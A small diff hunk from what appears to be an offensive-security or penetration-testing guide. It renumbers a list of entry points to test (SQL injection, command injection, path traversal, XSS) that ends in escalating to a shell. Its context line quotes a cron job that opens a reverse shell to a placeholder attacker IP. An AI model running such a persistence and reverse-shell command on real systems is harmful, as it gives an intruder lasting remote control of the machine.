@@ -398,10 +398,10 @@ echo "*/5 * * * * bash -c 'bash -i >& /dev/tcp/YOUR_IP/6666 0>&1'" | \
 
 Test each entry point systematically:
 1. SQL injection on `q` and `user_id`
-2. Command injection on `ip`
-3. Path traversal on `file`
-4. XSS on `q`
-5. Escalate any findings to get a shell
+1. Command injection on `ip`
+1. Path traversal on `file`
+1. XSS on `q`
+1. Escalate any findings to get a shell
 
 ---
 
